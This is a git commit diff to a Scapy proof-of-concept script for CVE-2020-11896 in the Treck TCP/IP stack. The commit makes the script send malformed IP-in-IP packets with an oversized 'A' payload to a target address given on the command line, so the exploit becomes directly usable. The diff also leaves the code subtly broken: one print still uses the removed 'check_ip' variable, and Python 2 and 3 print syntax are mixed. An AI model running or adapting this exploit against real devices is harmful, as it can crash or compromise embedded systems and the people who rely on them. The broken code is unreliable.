ffb5d846caa93d61df446ba088839e9c0b31933d
Fans0n <62650136+Fans0n-Fan@users.noreply.github.com>
2020-09-03 14:37:45 +0800

    Update exp.py

--- treck20/exp.py
+++ treck20/exp.py
@@ -5,12 +5,12 @@ except Exception as e:
     print ("[*] You need install scapy first:\n[*] sudo pip install scapy ")
 if __name__ == '__main__':
     try:
-        check_ip = sys.argv[1]
+        address = sys.argv[1]
         i = 0
         print ("[*] Trying CVE-2020-11896.PoC for" + check_ip)
         #for i in range(0,10):
         #while True:
-        send(IP(dst="",proto=4,id=0xabcd)/IP(dst="",len=32,proto=17)/UDP(dport=68,chksum=0,len=12)/("A"*1000),inter=2,count=3)
+        send(IP(dst=address,proto=4,id=0xabcd)/IP(dst=address,len=32,proto=17)/UDP(dport=68,chksum=0,len=12)/("A"*1000),inter=2,count=3)
         print ("[*] Check Over!! ")
     except Exception as e:
-        print "[*] usage: sudo python exp.py " + check_ip
+        print "[*] usage: sudo python exp.py " + address
